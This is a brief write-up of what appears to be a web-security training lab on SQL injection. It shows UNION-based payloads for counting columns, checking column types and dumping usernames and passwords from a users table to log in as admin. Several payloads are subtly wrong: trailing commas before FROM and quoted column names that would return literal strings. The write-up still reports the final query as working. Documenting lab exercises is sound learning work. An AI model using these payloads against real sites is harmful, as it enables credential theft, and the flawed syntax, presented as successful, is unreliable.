The goal of this lab is to retrieve data from other tables using the product category filter. It gives us a table name (users) and columns name (username and password).


(1) First step is determine number of columns returned by the query. I attempted this with 
'ORDER BY 1--

and 
'UNION SELECT NULL, NULL,--

we now know there are 2 columns next step is

(2) Determine data type of columns
'UNION SELECT 'a', 'b', FROM users--

both columns are text. So we can then assume this is the username and password and take it from the users table

(3) 'UNION SELECT 'username', 'password', FROM users--

this successfully returns a list of username and passwords- and we can use the admin's credentials ->login->complete the lab.